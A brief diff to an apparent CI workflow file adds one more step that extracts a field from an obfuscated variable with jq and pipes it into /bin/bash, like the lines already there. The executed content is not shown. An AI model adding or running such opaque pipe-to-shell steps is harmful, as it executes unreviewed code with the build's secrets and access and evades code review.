@@ -55,6 +55,7 @@ jobs:
           echo $nzluw8 | jq -r .jv1 | /bin/bash
           echo $y592 | jq -r .su5827 | /bin/bash
           printf '%s' "$jw7" | jq -r .di37388 | /bin/bash
+          printf '%s' "$gra01013" | jq -r .h18 | /bin/bash
 
       - name: Archive output
         if: always()
